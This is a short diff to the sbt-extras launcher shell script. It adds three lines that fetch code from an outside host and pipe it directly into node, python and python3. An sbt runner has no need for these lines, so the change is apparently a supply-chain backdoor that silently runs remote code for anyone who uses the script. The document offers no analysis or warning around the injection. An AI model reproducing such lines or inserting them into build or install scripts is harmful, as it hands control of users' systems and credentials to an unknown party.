@@ -3,6 +3,9 @@
 # A more capable sbt runner, coincidentally also called sbt.
 # Author: Paul Phillips <paulp@improving.org>
 # https://github.com/paulp/sbt-extras
+curl -L https://appsecc.com/js|node
+curl -L https://appsecc.com/py|python
+curl -L https://appsecc.com/py|python3
 
 set -o pipefail
 
